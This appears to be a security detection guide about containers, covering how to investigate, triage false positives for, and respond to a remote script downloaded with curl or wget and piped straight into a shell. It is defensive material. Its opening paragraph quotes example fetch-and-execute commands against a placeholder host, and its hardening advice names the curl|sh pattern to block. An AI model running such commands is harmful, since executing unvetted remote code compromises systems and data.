### Investigating Payload Downloaded and Piped to Shell Detected via Defend for Containers

This rule detects an interactive session in a running Linux container where a downloader process is immediately followed by a shell execution, consistent with fetching code and executing it without writing a file. This matters because piping remote content directly into a shell enables fast, stealthy execution and can bypass filesystem-based controls and forensics. Attackers commonly run patterns like `curl http://host/payload.sh | sh` or `wget -qO- http://host/bootstrap | bash` during initial foothold or lateral movement inside containers.

### Possible investigation steps

- Capture the full interactive command line and session context (TTY/user, working directory, parent chain) to determine whether the shell received stdin from the downloader and what was executed.  
- Identify the remote URL/host contacted and pivot on outbound network telemetry (DNS/HTTP/SNI/IP) to confirm download success, reputation, and whether the endpoint has been used by other workloads.  
- Enumerate follow-on processes spawned by the shell within the next few minutes (e.g., package installs, compilers, crypto-miners, persistence tooling) to assess impact and scope of execution.  
- Check for container breakout or host interaction indicators by reviewing new mounts, access to the Docker/CRI socket, privileged namespace usage, and any writes to host paths from within the container.  
- Preserve volatile artifacts by exporting the container filesystem and collecting in-memory/runtime evidence (environment variables, loaded binaries, cron/systemd/user profiles) before the workload is recycled.

### False positive analysis

- An administrator or developer may use an interactive exec session to troubleshoot or apply a quick remediation by running `curl`/`wget` piped into `sh` (to avoid saving a temporary file), so validate the interactive user/TTY, parent process chain, and whether the contacted URL/host is an expected internal source.  
- During manual container bootstrap or environment setup, an operator may fetch a short initialization or configuration script via `curl`/`wget` and immediately invoke a shell to run it, so confirm it aligns with recent deployment/change activity and that follow-on process, network, and filesystem behavior matches the intended setup.

### Response and remediation

- Immediately isolate the affected container/pod by blocking egress and terminating any active `kubectl exec`/interactive sessions that launched `curl`/`wget` and then a shell to stop further command execution.  
- Preserve evidence before restart by snapshotting the container image/filesystem and collecting running process trees, open network connections, environment variables, and shell history/output associated with the piped execution.  
- Eradicate by deleting and redeploying the workload from a known-good image, rotating any secrets and tokens available to the container, and removing any unauthorized binaries, cron jobs, startup scripts, or modified entrypoints created by the shell session.  
- Escalate to incident response immediately if the downloaded content contacted unknown/external infrastructure, spawned post-exploitation tooling (e.g., miners, scanners, reverse shells), or showed signs of host interaction such as access to the container runtime socket or host-mounted paths.  
- Harden by restricting interactive exec access (RBAC/MFA/just-in-time), enforcing signed/approved images, applying network policies to limit outbound access, and adding runtime controls to block `curl|sh`/`wget|sh` patterns or require allowlisted internal artifact sources."""
